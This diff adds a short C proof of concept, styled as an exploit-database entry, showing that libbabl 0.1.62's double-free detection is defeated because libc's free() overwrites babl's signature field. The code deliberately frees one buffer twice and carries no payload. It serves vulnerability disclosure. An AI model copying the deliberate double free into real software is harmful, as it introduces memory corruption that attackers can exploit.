@@ -1,0 +1,57 @@
+# Exploit Title: libbabl 0.1.62 - Broken Double Free Detection (PoC)
+# Date: December 14, 2020
+# Exploit Author: Carter Yagemann
+# Vendor Homepage: https://www.gegl.org
+# Software Link: https://www.gegl.org/babl/
+# Version: libbabl 0.1.62 and newer
+# Tested on: Debian Buster (Linux 4.19.0-9-amd64)
+# Compile: gcc -Ibabl-0.1 -lbabl-0.1 babl-0.1.62_babl_free.c
+
+/*
+ * Babl has an interesting way of managing buffers allocated and freed using babl_malloc()
+ * and babl_free(). This is the structure of its allocations (taken from babl-memory.c):
+ *
+ * typedef struct
+ * {
+ *   char  *signature;
+ *   size_t size;
+ *   int  (*destructor)(void *ptr);
+ * } BablAllocInfo;
+ *
+ *
+ * signature is used to track whether a chunk was allocated by babl, and if so, whether
+ * it is currently allocated or freed. This is done by either pointing it to the global
+ * string "babl-memory" or "So long and thanks for all the fish." (babl-memory.c:44).
+ *
+ * Using this signature, babl can detect bad behavior's like double free (babl-memory.c:173):
+ *
+ * void
+ * babl_free (void *ptr,
+ *            ...)
+ * {
+ *   ...
+ *       if (freed == BAI (ptr)->signature)
+ *         fprintf (stderr, "\nbabl:double free detected\n");
+ *
+ *
+ * Or so the developers think. As it turns out, because babl internally uses libc's malloc()
+ * and free(), which has its own data that it stores within freed chunks, most systems will
+ * overwrite babl's signature variable upon freeing, breaking the double free detection.
+ * The simple PoC below demonstrates this:
+ */
+
+#include <stdlib.h>
+#include <stdio.h>
+#include <string.h>
+
+#include <babl/babl-memory.h>
+
+int main(int argc, char **argv) {
+    void *buf = babl_malloc(42);
+    babl_free(buf);
+    // BUG: reports an "unknown" pointer warning when the following is clea=
+rly a double free
+    babl_free(buf);
+
+    return 0;
+}
